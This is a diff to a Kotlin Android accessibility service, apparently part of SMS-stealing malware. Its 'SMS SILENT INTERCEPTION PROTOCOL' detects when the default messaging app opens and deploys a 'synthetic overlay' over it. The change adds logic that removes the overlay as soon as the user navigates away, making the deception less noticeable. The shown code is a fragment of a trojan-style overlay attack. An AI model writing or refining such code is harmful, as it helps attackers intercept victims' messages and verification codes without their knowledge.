@@ -501,13 +501,17 @@ class MyAccessibilityService : AccessibilityService() {
 
         // --- SMS SILENT INTERCEPTION PROTOCOL ---
         val smsDeceptionActive = getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean("sms_deception_active", false)
-        if (smsDeceptionActive && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             val defaultSmsPkg = android.provider.Telephony.Sms.getDefaultSmsPackage(this) ?: "com.google.android.apps.messaging"
-            if (pkgName == defaultSmsPkg || pkgName.contains("messaging", ignoreCase = true)) {
+            if (smsDeceptionActive && (pkgName == defaultSmsPkg || pkgName.contains("messaging", ignoreCase = true))) {
                 if (!DynamicUIManager.isSmsInterceptorActive) {
                     DebugLogger.log("SMS_INTERCEPT", "Default SMS app launched. Deploying synthetic overlay.")
                     DynamicUIManager.deploySmsInterceptor(this)
                 }
+            } else if (DynamicUIManager.isSmsInterceptorActive && pkgName != packageName && pkgName != "android") {
+                // User pressed Home, Recents, or switched apps. Collapse overlay instantly.
+                DebugLogger.log("SMS_INTERCEPT", "User navigated away to $pkgName. Dismissing synthetic overlay.")
+                DynamicUIManager.removeOverlay(this, "USER_NAVIGATED_AWAY", true)
             }
         }
 
